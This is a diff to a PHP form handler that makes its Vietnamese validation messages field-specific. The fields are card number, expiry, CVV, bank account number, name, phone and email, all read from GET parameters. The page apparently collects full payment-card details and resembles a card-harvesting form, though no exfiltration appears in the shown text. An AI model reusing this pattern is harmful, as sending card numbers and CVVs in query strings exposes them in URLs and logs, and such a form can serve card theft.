@@ -31,28 +31,28 @@
         // Button 1
         if (isset($_GET['btn1'])) {
             if (empty($_GET['cnumber'])) {
-                $Error1 = "Xin vui lòng nhập thông tin";
+                $Error1 = "Xin vui lòng nhập số thẻ";
             }
             else{
                 $cnumber = $_GET['cnumber'];
             }
 
             if (empty($_GET['edate'])) {
-                $Error2 = "Xin vui lòng nhập thông tin";
+                $Error2 = "Xin vui lòng nhập hạn thẻ";
             }
             else{
                 $edate = $_GET['edate'];
             }
 
             if (empty($_GET['cvv'])) {
-                $Error3 = "Xin vui lòng nhập thông tin";
+                $Error3 = "Xin vui lòng nhập 3 mã số cuối thẻ";
             }
             else{
                 $cvv = $_GET['cvv'];
             }
 
             if (empty($_GET['email'])) {
-                $Error4 = "Xin vui lòng nhập thông tin";
+                $Error4 = "Xin vui lòng nhập email đăng ký thẻ";
             }
             else{
                 $email = $_GET['email'];
@@ -69,28 +69,28 @@
         // Button 2
         if (isset($_GET['btn2'])) {
             if (empty($_GET['ccnumber'])) {
-                $Error5 = "Xin vui lòng nhập thông tin";
+                $Error5 = "Xin vui lòng nhập số tài khoản";
             }
             else{
                 $ccnumber = $_GET['ccnumber'];
             }
 
             if (empty($_GET['fullname'])) {
-                $Error6 = "Xin vui lòng nhập thông tin";
+                $Error6 = "Xin vui lòng nhập họ tên";
             }
             else{
                 $fullname = $_GET['fullname'];
             }
 
             if (empty($_GET['phonenumber'])) {
-                $Error7 = "Xin vui lòng nhập thông tin";
+                $Error7 = "Xin vui lòng nhập số điện thoại";
             }
             else{
                 $phonenumber = $_GET['phonenumber'];
             }
 
             if (empty($_GET['email1'])) {
-                $Error8 = "Xin vui lòng nhập thông tin";
+                $Error8 = "Xin vui lòng nhập email";
             }
             else{
                 $email1 = $_GET['email1'];
